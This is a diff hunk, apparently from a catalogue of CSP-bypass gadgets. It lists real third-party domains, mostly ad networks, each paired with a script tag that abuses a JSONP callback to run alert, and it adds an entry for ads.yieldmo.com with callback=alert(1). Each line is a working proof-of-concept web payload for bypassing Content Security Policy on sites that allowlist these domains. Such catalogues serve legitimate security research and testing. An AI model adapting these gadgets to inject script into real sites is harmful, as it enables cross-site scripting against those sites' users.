@@ -13,6 +13,7 @@ acs.youku.com	<script src="https://acs.youku.com/h5/mtop.youku.playlog.open.get/
 adhouse.pro	<script src="https://adhouse.pro/wp-json?_jsonp=window.alert"></script>
 admatic.com.tr	<script src="https://admatic.com.tr/wp-json?_jsonp=window.alert"></script>
 admixer.com	<script src="https://admixer.com/wp-json?_jsonp=window.alert"></script>
+ads.yieldmo.com	<script src=https://ads.yieldmo.com/v002/t_ads/ads?callback=alert(1)-></script>
 adtelligent.com	<script src="https://adtelligent.com/wp-json?_jsonp=window.alert"></script>
 advangelists.com	<script src="https://advangelists.com/wp-json?_jsonp=window.alert"></script>
 advertising.com	<script src="https://advertising.com/wp-json?_jsonp=window.alert"></script>
